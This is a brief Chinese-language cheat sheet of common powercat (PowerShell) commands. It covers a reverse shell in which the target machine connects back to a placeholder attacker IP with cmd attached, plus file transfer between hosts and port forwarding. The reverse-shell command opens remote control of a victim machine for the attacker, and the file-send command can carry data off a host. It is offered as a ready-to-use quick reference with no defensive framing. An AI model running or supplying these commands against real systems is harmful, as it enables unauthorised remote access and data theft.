## 🔥 最常用的命令

### 1. 反弹 Shell
```powershell
# 攻击机监听
powercat -l -p 4444

# 目标机连接
powercat -c <攻击机IP> -p 4444 -e cmd
```

### 2. 文件传输
```powershell
# 接收文件
powercat -l -p 8000 -of C:\received.txt

# 发送文件
powercat -c <接收方IP> -p 8000 -i C:\send.txt
```

### 3. 端口转发
```powershell
# 转发流量
powercat -l -p 8000 -r tcp:<目标IP>:9000
```
